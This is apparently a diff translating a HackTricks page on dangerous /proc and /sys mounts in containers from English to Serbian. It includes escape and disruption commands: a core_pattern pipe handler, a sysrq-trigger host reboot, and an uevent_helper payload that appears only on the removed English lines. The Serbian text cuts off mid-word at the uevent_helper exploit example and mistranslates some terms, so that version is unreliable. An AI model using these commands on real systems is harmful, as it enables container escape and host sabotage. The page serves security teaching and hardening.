@@ -1,171 +1,152 @@
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite videti **oglašavanje vaše kompanije na HackTricks-u** ili **preuzeti HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
 
-The exposure of `/proc` and `/sys` without proper namespace isolation introduces significant security risks, including attack surface enlargement and information disclosure. These directories contain sensitive files that, if misconfigured or accessed by an unauthorized user, can lead to container escape, host modification, or provide information aiding further attacks. For instance, incorrectly mounting `-v /proc:/host/proc` can bypass AppArmor protection due to its path-based nature, leaving `/host/proc` unprotected.
+Izlaganje `/proc` i `/sys` bez odgovarajuće izolacije imenika predstavlja značajne sigurnosne rizike, uključujući povećanje površine napada i otkrivanje informacija. Ovi direktorijumi sadrže osetljive datoteke koje, ako su netačno konfigurisane ili pristupljene od strane neovlašćenog korisnika, mogu dovesti do bekstva iz kontejnera, izmena na hostu ili pružanja informacija koje pomažu daljim napadima. Na primer, netačno montiranje `-v /proc:/host/proc` može zaobići AppArmor zaštitu zbog svoje putem zasnovane prirode, ostavljajući `/host/proc` nezaštićenim.
 
-**You can find further details of each potential vuln in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts).**
+**Možete pronaći dalje detalje o svakom potencijalnom propustu na [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts).**
 
-# procfs Vulnerabilities
+# procfs Ranjivosti
 
 ## `/proc/sys`
-This directory permits access to modify kernel variables, usually via `sysctl(2)`, and contains several subdirectories of concern:
+Ovaj direktorijum omogućava pristup za izmenu kernel promenljivih, obično putem `sysctl(2)`, i sadrži nekoliko poddirektorijuma od interesa:
 
-### **`/proc/sys/kernel/core_pattern`**  
-   - Described in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-   - Allows defining a program to execute on core-file generation with the first 128 bytes as arguments. This can lead to code execution if the file begins with a pipe `|`.
-   - **Testing and Exploitation Example**:
-     ```bash
-     [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
-     cd /proc/sys/kernel
-     echo "|$overlay/shell.sh" > core_pattern # Set custom handler
-     sleep 5 && ./crash & # Trigger handler
-     ```
+### **`/proc/sys/kernel/core_pattern`**
+- Opisano u [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
+- Omogućava definisanje programa koji se izvršava prilikom generisanja core fajla sa prvih 128 bajtova kao argumentima. Ovo može dovesti do izvršavanja koda ako fajl počinje sa cevkom `|`.
+- **Testiranje i primer eksploatacije**:
+```bash
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Testiranje pristupa pisanju
+cd /proc/sys/kernel
+echo "|$overlay/shell.sh" > core_pattern # Postavljanje prilagođenog rukovaoca
+sleep 5 && ./crash & # Pokretanje rukovaoca
+```
 
 ### **`/proc/sys/kernel/modprobe`**
-   - Detailed in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-   - Contains the path to the kernel module loader, invoked for loading kernel modules.
-   - **Checking Access Example**:
-     ```bash
-     ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
-     ```
+- Detaljno opisano u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Sadrži putanju do učitavača kernel modula, koji se poziva prilikom učitavanja kernel modula.
+- **Provera pristupa primer**:
+```bash
+ls -l $(cat /proc/sys/kernel/modprobe) # Provera pristupa modprobe-u
+```
 
 ### **`/proc/sys/vm/panic_on_oom`**
-   - Referenced in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-   - A global flag that controls whether the kernel panics or invokes the OOM killer when an OOM condition occurs.
+- Pomenuto u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Globalna oznaka koja kontroliše da li kernel pravi paniku ili pokreće OOM ubica kada se pojavi OOM uslov.
 
 ### **`/proc/sys/fs`**
-   - As per [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contains options and information about the file system.
-   - Write access can enable various denial-of-service attacks against the host.
+- Kako je navedeno u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), sadrži opcije i informacije o fajl sistemu.
+- Pristup pisanju može omogućiti razne napade uskraćivanjem usluge na hostu.
 
 ### **`/proc/sys/fs/binfmt_misc`**
-   - Allows registering interpreters for non-native binary formats based on their magic number.
-   - Can lead to privilege escalation or root shell access if `/proc/sys/fs/binfmt_misc/register` is writable.
-   - Relevant exploit and explanation:
-     - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
-     - In-depth tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+- Omogućava registraciju interpretatora za ne-nativne binarne formate na osnovu njihovog magičnog broja.
+- Može dovesti do eskalacije privilegija ili pristupa root shell-u ako je `/proc/sys/fs/binfmt_misc/register` dostupan za pisanje.
+- Relevantni eksploit i objašnjenje:
+- [Rootkit za siromašne putem binfmt_misc](https://github.com/toffan/binfmt_misc)
+- Detaljan tutorijal: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
-## Others in `/proc`
+## Ostali u `/proc`
 
 ### **`/proc/config.gz`**
-   - May reveal the kernel configuration if `CONFIG_IKCONFIG_PROC` is enabled.
-   - Useful for attackers to identify vulnerabilities in the running kernel.
+- Može otkriti konfiguraciju kernela ako je `CONFIG_IKCONFIG_PROC` omogućeno.
+- Korisno napadačima za identifikaciju ranjivosti u pokrenutom kernelu.
 
 ### **`/proc/sysrq-trigger`**
-   - Allows invoking Sysrq commands, potentially causing immediate system reboots or other critical actions.
-   - **Rebooting Host Example**:
-     ```bash
-     echo b > /proc/sysrq-trigger # Reboots the host
-     ```
+- Omogućava pozivanje Sysrq komandi, što može dovesti do trenutnog ponovnog pokretanja sistema ili drugih kritičnih radnji.
+- **Primer ponovnog pokretanja hosta**:
+```bash
+echo b > /proc/sysrq-trigger # Ponovno pokretanje hosta
+```
 
 ### **`/proc/kmsg`**
-   - Exposes kernel ring buffer messages.
-   - Can aid in kernel exploits, address leaks, and provide sensitive system information.
+- Otkriva poruke iz prstena za kernel.
+- Može pomoći u eksploataciji kernela, otkrivanju adresa i pružanju osetljivih informacija o sistemu.
 
 ### **`/proc/kallsyms`**
-   - Lists kernel exported symbols and their addresses.
-   - Essential for kernel exploit development, especially for overcoming KASLR.
-   - Address information is restricted with `kptr_restrict` set to `1` or `2`.
-   - Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Navodi izvođene simbole kernela i njihove adrese.
+- Neophodno za razvoj eksploita kernela, posebno za prevazilaženje KASLR-a.
+- Informacije o adresi su ograničene kada je `kptr_restrict` postavljen na `1` ili `2`.
+- Detalji u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 ### **`/proc/[pid]/mem`**
-   - Interfaces with the kernel memory device `/dev/mem`.
-   - Historically vulnerable to privilege escalation attacks.
-   - More on [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Interfejs sa uređajem za memoriju kernela `/dev/mem`.
+- Istoriski ranjiv na napade eskalacije privilegija.
+- Više informacija na [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 ### **`/proc/kcore`**
-   - Represents the system's physical memory in ELF core format.
-   - Reading can leak host system and other containers' memory contents.
-   - Large file size can lead to reading issues or software crashes.
-   - Detailed usage in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
+- Predstavlja fizičku memoriju sistema u ELF core formatu.
+- Čitanje može otkriti sadržaj memorije host sistema i drugih kontejnera.
+- Velika veličina fajla može dovesti do problema sa čitanjem ili rušenjem softvera.
+- Detaljno objašnjenje u [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 ### **`/proc/kmem`**
-   - Alternate interface for `/dev/kmem`, representing kernel virtual memory.
-   - Allows reading and writing, hence direct modification of kernel memory.
+- Alternativni interfejs za `/dev/kmem`, predstavlja virtuelnu memoriju kernela.
+- Omogućava čitanje i pisanje, što direktno menja memoriju kernela.
 
 ### **`/proc/mem`**
-   - Alternate interface for `/dev/mem`, representing physical memory.
-   - Allows reading and writing, modification of all memory requires resolving virtual to physical addresses.
+- Alternativni interfejs za `/dev/mem`, predstavlja fizičku memoriju.
+- Omogućava čitanje i pisanje, a za modifikaciju cele memorije potrebno je rešiti virtuelne u fizičke adrese.
 
 ### **`/proc/sched_debug`**
-   - Returns process scheduling information, bypassing PID namespace protections.
-   - Exposes process names, IDs, and cgroup identifiers.
+- Vraća informacije o rasporedu procesa, zaobilazeći zaštitu PID imenskog prostora.
+- Otkriva imena procesa, ID-ove i identifikatore cgroup-a.
 
 ### **`/proc/[pid]/mountinfo`**
-   - Provides information about mount points in the process's mount namespace.
-   - Exposes the location of the container `rootfs` or image.
+- Pruža informacije o tačkama montiranja u imenskom prostoru procesa.
+- Otkriva lokaciju `rootfs`-a ili slike kontejnera.
 
-## `/sys` Vulnerabilities
+## `/sys` Ranjivosti
 
 ### **`/sys/kernel/uevent_helper`**
-   - Used for handling kernel device `uevents`.
-   - Writing to `/sys/kernel/uevent_helper` can execute arbitrary scripts upon `uevent` triggers.
-   - **Example for Exploitation**:
-     %%%bash
-     # Creates a payload
-     echo "#!/bin/sh" > /evil-helper
-     echo "ps > /output" >> /evil-helper
-     chmod +x /evil-helper
-     # Finds host path from OverlayFS mount for container
-     host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
-     # Sets uevent_helper to malicious helper
-     echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
-     # Triggers a uevent
-     echo change > /sys/class/mem/null/uevent
-     # Reads the output
-     cat /output
-     %%%
-
+- Koristi se za rukovanje `uevent`-ima kernel uređaja.
+- Pisanje u `/sys/kernel/uevent_helper` može izvršiti proizvoljne skripte prilikom okidača `uevent`.
+- **Primer eksplo
 ### **`/sys/class/thermal`**
-   - Controls temperature settings, potentially causing DoS attacks or physical damage.
+- Kontroliše podešavanja temperature, potencijalno uzrokujući DoS napade ili fizičku štetu.
 
 ### **`/sys/kernel/vmcoreinfo`**
-   - Leaks kernel addresses, potentially compromising KASLR.
+- Otkriva adrese jezgra, potencijalno kompromitujući KASLR.
 
 ### **`/sys/kernel/security`**
-   - Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
-   - Access might enable a container to disable its MAC system.
+- Sadrži `securityfs` interfejs, omogućavajući konfiguraciju Linux Security Modula kao što je AppArmor.
+- Pristup može omogućiti kontejneru da onemogući svoj MAC sistem.
 
-### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**
-   - Exposes interfaces for interacting with EFI variables in NVRAM.
-   - Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.
+### **`/sys/firmware/efi/vars` i `/sys/firmware/efi/efivars`**
+- Otkriva interfejse za interakciju sa EFI varijablama u NVRAM-u.
+- Pogrešna konfiguracija ili iskorišćavanje može dovesti do oštećenja laptopa ili host mašine koja se ne može podići.
 
 ### **`/sys/kernel/debug`**
-   - `debugfs` offers a "no rules" debugging interface to the kernel.
-   - History of security issues due to its unrestricted nature.
+- `debugfs` nudi "bez pravila" interfejs za debagovanje jezgra.
+- Ima istoriju sigurnosnih problema zbog svoje neograničene prirode.
 
 
-## References
+## Reference
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
-* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
-* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
+* [Razumevanje i ojačavanje Linux kontejnera](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
+* [Zloupotreba privilegovanih i neprivilegovanih Linux kontejnera](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
 
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
-
-
